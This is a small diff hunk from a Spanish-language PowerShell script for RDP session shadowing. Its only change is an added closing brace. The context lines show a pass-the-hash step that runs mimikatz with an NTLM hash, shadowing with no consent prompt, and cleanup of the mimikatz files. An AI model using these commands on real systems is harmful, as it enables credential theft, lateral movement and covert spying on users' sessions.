@@ -255,7 +255,7 @@ $Ps4="netsh advfirewall firewall set rule group='Instrumental de Administración
         else { $mimipwn = "mstsc` /v` $computer` $admin` /shadow:$shadow` /noconsentprompt` /f"
         $passthemimi = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:$mimipwn' exit"
         if(Test-Path variable:mimikatz) { powershell $mimipath\mimikatz.exe $passthemimi ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
-        else { mstsc /v $computer $admin /shadow:$shadow /noconsentprompt /prompt /f }}
+        else { mstsc /v $computer $admin /shadow:$shadow /noconsentprompt /prompt /f }}}
 
     else { Write-Host ""
         Write-Host "$version detectado, aplicando parche.."
